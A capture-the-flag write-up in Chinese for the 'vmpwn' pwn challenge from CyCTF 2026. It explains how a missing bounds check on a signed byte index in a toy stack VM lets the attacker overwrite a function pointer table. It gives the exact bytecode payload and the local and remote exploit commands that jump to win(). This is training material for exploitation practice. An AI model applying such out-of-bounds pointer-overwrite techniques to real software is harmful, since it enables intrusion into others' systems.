---
title: "vmpwn"
ctf: "CyCTF 2026"
date: 2026-09-18
category: pwn
difficulty: easy
points: "未知"
flag_format: "flag{...}"
author: "Codex"
---

# vmpwn

## Summary

题目实现了一个简单的栈式虚拟机。`op=2` 使用有符号字节作为数组索引，却没有限制索引范围，导致可以越界覆盖 VM 的函数指针表；随后利用 `op=4` 调用被覆盖的函数指针，跳转到内置的 `win()`。

## Solution

### Step 1: 分析 VM 布局

`VM` 结构体的布局如下：

```c
struct VM {
    uint64_t mem[8];
    void (*funcs[2])(void);
    uint64_t stack[16];
    int sp;
};
```

`mem` 的合法索引只有 `0..7`，但 `op=2` 的索引在使用时被符号扩展为 `int8_t`，没有进行边界检查。

因此：

```text
mem[8] == funcs[0]
mem[9] == funcs[1]
```

程序没有开启 PIE，`win()` 地址固定为 `0x4012c7`。

### Step 2: 构造字节码

使用以下指令序列：

```text
01 <win 地址>   push win 地址
02 08           pop 到 mem[8]，覆盖 funcs[0]
04 00           调用 funcs[0]
```

对应的 payload 为：

```text
01 c7 12 40 00 00 00 00 00 02 08 04 00
```

完整脚本见 [exp.py](./exp.py)。本地模式运行：

```bash
python3 exp.py
```

远程模式运行：

```bash
python3 exp.py REMOTE HOST=目标地址 PORT=目标端口
```

脚本会将 `win()` 地址写入 `funcs[0]`，调用后由 `win()` 打开并输出 `/flag`。

## Flag

```text
flag{This_iS_a_f1ag}
```
